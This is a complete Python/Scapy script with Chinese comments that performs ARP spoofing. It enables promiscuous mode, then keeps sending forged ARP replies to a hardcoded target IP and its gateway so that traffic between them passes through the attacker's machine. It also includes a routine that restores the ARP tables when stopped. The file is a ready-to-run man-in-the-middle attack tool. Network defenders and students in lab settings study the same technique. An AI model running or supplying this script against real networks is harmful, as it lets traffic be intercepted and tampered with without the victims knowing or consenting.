from scapy.all import *
import os
import time

def set_promiscuous_mode(iface, enable=True):
    """设置混杂模式"""
    mode = "on" if enable else "off"
    os.system(f"ip link set dev {iface} promisc {mode}")
    print(f"[INFO] 混杂模式设置为 {mode} on interface {iface}")

def send_arp_packet(target_ip, target_mac, required_ip, false_mac, iface):
    """发送 ARP 包"""
    if target_mac is None:
        print(f"[ERROR] 无法获取目标 {target_ip} 的 MAC 地址")
        return
    if false_mac is None:
        print(f"[ERROR] 无法获取本机的 MAC 地址")
        return
    packet = Ether(dst=target_mac) / ARP(
        op=2, pdst=target_ip, hwdst=target_mac, psrc=required_ip, hwsrc=false_mac
    )
    sendp(packet, iface=iface, verbose=False)
    print(f"[INFO] 发送 ARP 包: {required_ip} ({false_mac}) -> {target_ip} ({target_mac})")

def arp_spoof(target_ip, gateway_ip):
    """启动 ARP 欺骗"""
    iface = "eth0"  # 根据实际网卡名称修改
    set_promiscuous_mode(iface, enable=True)  # 启用混杂模式

    try:
        # 获取目标设备和网关的 MAC 地址
        target_mac = getmacbyip(target_ip)
        gateway_mac = getmacbyip(gateway_ip)
        self_mac = get_if_hwaddr(iface)

        if target_mac is None or gateway_mac is None or self_mac is None:
            print(f"[ERROR] 获取 MAC 地址失败: target_mac={target_mac}, gateway_mac={gateway_mac}, self_mac={self_mac}")
            return

        print(f"[INFO] 开始 ARP 欺骗: Target {target_ip}({target_mac}), Gateway {gateway_ip}({gateway_mac})")

        while True:
            # 向目标发送欺骗包
            send_arp_packet(target_ip, target_mac, gateway_ip, self_mac, iface)
            # 向网关发送欺骗包
            send_arp_packet(gateway_ip, gateway_mac, target_ip, self_mac, iface)
            time.sleep(2)

    except KeyboardInterrupt:
        print("\n[INFO] 恢复网络...")
        restore_arp(target_ip, gateway_ip, iface)
        set_promiscuous_mode(iface, enable=False)  # 恢复正常模式
        print("[INFO] ARP 欺骗已停止。")

def restore_arp(target_ip, gateway_ip, iface):
    """恢复 ARP 表"""
    print(f"[INFO] 恢复 ARP 表: Target {target_ip}, Gateway {gateway_ip}")
    target_mac = getmacbyip(target_ip)
    gateway_mac = getmacbyip(gateway_ip)

    if target_mac is None or gateway_mac is None:
        print(f"[ERROR] 无法恢复 ARP 表: target_mac={target_mac}, gateway_mac={gateway_mac}")
        return

    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), count=3)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), count=3)
    print("[INFO] ARP 表恢复完成")

if __name__ == "__main__":
    target_ip = "10.2.0.195"  # 替换为目标设备的 IP
    gateway_ip = "10.2.0.1"   # 替换为网关 IP

    try:
        arp_spoof(target_ip, gateway_ip)
    except Exception as e:
        print(f"[ERROR] 发生错误: {e}")
